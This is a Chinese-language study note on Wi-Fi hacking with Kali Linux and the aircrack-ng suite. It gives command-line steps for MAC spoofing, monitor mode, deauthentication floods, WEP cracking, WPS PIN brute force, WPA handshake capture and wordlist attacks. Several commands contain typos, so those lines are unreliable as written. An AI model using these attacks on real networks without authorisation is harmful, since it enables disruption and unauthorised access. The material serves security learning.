## 搭建实验环境

VritualBox + KaliLinux

[KaliLinux VirtualBox Images下载地址](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)（下载太慢 直接使用原版镜像安装）

网路配置使用NAT Network，此种情况是将宿主机当作路由

拍摄快照 fresh install

安装完成，更新`apt-get update`

安装terminater `apt-get install terminator`

### 无线网卡推荐

#### 2018/12/22

Atheroes AR9271芯片（稳定，仅支持2.4G）、Realtek AR8812AU芯片（暂时不太稳定，支持2.4G and 5G）

### 更改Mac地址

`ifconfig`显示所有网络设备信息 eth0以太网卡，lo本地回环，wlan0无线网卡

```
inet --> ip地址
netMask --> 掩码
ether --> Mac地址
```

先关掉网络接口

```
ifconfig waln0 down
```

更改option

```
ifconfig wlan0 hw ether 00:11:22:33:44:55
```

hw -> (hardware)

启动接口

```\
ifconfig waln0 up
```

#### 开启分析模式（需无线网卡支持）

`iwconfig`显示无限网络接口信息

> Mode:Managed -> 改状态为所有网卡默认状态，只接受目的mac地址为自己mac地址的包

关掉接口

```
# ifconfig waln0 down
```

（非必需）网络管理会关掉

```
# airmon-ng check kill (chek any process can interfer with monitor mode and kill it)
```

切换到monitor模式

```
# iwconfig wlan0 mode monitor
```

启动

```
# ifconfig wlan0 up
```

##### 方法2

```
# ifconfig wlan0 down
# airmon-ng check kill
```

仍然使用airmon-ng

```
airmon-ng start waln0 （在waln0接口上打开分析模式）
```

会开启一个名为waln0mon模式的监听接口，之前waln0的interface消失

## Network Hacking - Pre Connection Attacks


### Packet Sniffing Basics Using Airodump-ng

#### airodump-ng

检测有哪些无限网络
```
airodump-ng wlan0 
```

监测特定AP
```
airodump-ng --bssid 11:22:33:44:55  --channel 2 --write test wlan0
```

抓到的包记录在 testXX.cap 文件中

#### Deauthentication Attack (Disconnectiong any device)

```
aireplay-ng --deauth 100000000 -a 11:22:33:44:55 -c 11:22:33:44:55  wlan0
```

极少情况下 该命令需要 airodump-ng 在监测该AP时才能运行

### WiFi Bands - 2.4Ghz & 5Ghz Frequencies

扫描5G wifi `airodump-ng --band a wlan0 ` (band a support 5Ghz frequency)

扫描5G and 2.4G `airodump-ng --band abg wlan0`

## Gaining Access

### WEP(Wired Equivalent Privacy)

使用RC4算法加密数据

IV（initialization vector 24bits）+Key(password) = Key stream, 每个报文都会单独生成IV,且明文传送，然其长度为24bit，将会重复

### WEP Cracking - Basic Case

思路：

​	使用airodump-ng抓大量的包，从而得到重复的iv

​	`airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --writebasic_wep wlan0`

​	使用aircrack-ng分析破解key

​	`aircrack-ng basic_wep-01.cap`

​	拷贝Key 去掉 : 即可

### WEP Cracking - Fake Authentication

开启侦听

`airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write arpreplay mon0`

fake auth attack

`airreplay-ng --fakeauth 0 -a AS_MAC -h MY_WIRELESS＿MAC mon0`

可以看到 正在监听的网络AUTH变为OPN

###WEP Cracking - ARP Request Replay Attack

在侦听的同时

`airreplay-ng --arpreplay -b AS_MAC -h MY_WIRELESS＿MAC  mon0`

然后

`aircrack-ng arpreplay-01.cap` 

### WPA/WPA2 Cracking - Introduction

WPA/WPA2只是加密算法不同，破解步骤几乎相同

WPA/WPA2 破解有一定难度，所以值得尝试 wps

wps，开启PBC后会拒绝所有连接

### WPA/WPA2 Cracking - Exploiting WPS Feature

1.检测有哪些设备打开了wps

`wash --interface mon0`

2.1暴力破解 pin

`reaver --bssid TARGET_MAC --channel 1 --interface wlan0 -vvv --no-associate`

2.2与目标网路建立连接

`airreplay-ng --fakeauth 30 -a AP_MAC -h ADAPTER_MAC wlan0  `(每30秒重试一次)

### WPA/WPA2 Cracking - How to Capture the HandShake

1.监听目标网络，存到文件

`airodump --bssid TARGET_MAC --channel 1 --write wpa_handshake wlan0`

等到出现handshake(提示 WPA handshake: MAC_ADDRESS)

可以使用deauth攻击

`aireplay-ng --deauth 4  --a Target_AP_MAC -c CLIENT_MAC mon0`

handshake 里未包含秘钥信息，但可以用来检测密码是否正确

### WPA/WPA2 Cracking - Creating a Wordlist

创建密码表

`crunch [min] [max] [characters] -t [pattern] -o [FileName]`

example:

`crunch 6 8 123abc$ -o wordlist -t a@@@@b`

### WPA/WPA2 Cracking - Using a Wordlist Attack

原理 aircrack-ng 通过字典和四次握手报文的有效信息里合成mic 和 原来的mic信息进行对比

MIC (message integrity code)

`aircrack-ng handshake.cap-w wordlist.txt `

高级用法：

​	using gpu 加速 通过pipe边生成密码边验证

​	use rainbow tables

​	暂停  继续

​	evil tween attack









   